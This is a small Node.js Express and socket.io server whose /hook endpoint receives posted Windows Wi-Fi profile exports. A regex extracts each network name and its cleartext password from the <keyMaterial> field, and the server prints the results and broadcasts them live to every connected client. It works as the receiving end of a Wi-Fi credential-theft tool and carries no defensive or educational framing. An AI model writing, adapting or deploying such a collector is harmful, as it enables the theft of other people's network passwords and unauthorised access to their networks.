const express = require('express');
const app = express();
const http = require('http');
const bodyParser = require("body-parser")
const server = http.createServer(app);
const { Server } = require("socket.io");

const io = new Server(server, {
    cors: {
        origin: "*"
    }
});

app.use(bodyParser.json())
app.use(express.urlencoded({ extended: true }));

PORT = 5050

app.get('/', (req, res) => {
  res.send("🏠")
});

app.post("/hook", (req, res) => {
    const data = Object.keys(req.body)[0];
    const regexp = /Wi-Fi-(.*)?.xml(.*)<keyMaterial>(.*)?<\/keyMaterial>/gm

    const matches = Array.from(data.matchAll(regexp))

    const passList = matches.map(match=>({"ssid":match[1],"pass":match[3]}))

    console.log(passList)

    io.emit("passwords",passList)
    
    res.status(200).end()
})

io.on('connection', (socket) => {
  console.log('a user connected');
});

server.listen(PORT, () => {
  console.log(`Listening on ${PORT}`);
});